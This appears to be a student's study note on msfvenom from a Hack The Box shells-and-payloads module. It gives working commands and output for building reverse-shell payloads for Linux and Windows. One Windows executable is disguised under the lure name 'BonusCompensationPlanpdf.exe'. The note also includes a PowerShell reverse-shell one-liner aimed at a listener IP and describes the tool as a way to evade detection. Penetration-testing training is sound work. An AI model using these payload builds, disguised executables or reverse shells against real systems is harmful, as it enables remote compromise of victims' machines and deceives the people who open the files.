msfvenom
###########

Date: 2024-11-17 18:30

Status:

Description
************
MSFvenom is a payload encoder to bypass detection

Staged payloads
****************

Creates a ``stage`` to allow more code to be downloaded

Stageless payloads
*********************

Smaller payloads that are sent as is, smaller means less traffic. ##
Examples

Other examples:
`Using the Metasploit Framework <Using the Metasploit Framework>`__

example 1: Listing all payloads

.. code-block:: console 

   msfvenom -l payloads | grep java

Example 1.1 : Listing options for selected payload

.. code-block:: console

   msfvenom -p java/jsp_shell_reverse_tcp --list-options

Example 2: Building a payload (-p creates payload) for Linux

.. code-block:: console

   Temen@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

   [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
   [-] No arch selected, selecting arch: x64 from the payload
   No encoder specified, outputting raw payload
   Payload size: 74 bytes
   Final size of elf file: 194 bytes

Example 3: Building a payload for Windows (will likely be detected in
Windows)

.. code-block:: console

   Temen@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

   [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
   [-] No arch selected, selecting arch: x86 from the payload
   No encoder specified, outputting raw payload
   Payload size: 324 bytes
   Final size of exe file: 73802 bytes

PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

References
***********
https://academy.hackthebox.com/module/115/section/1205
https://medium.com/@thummardarshil1998/shells-and-payloads-895385fd871d
https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/
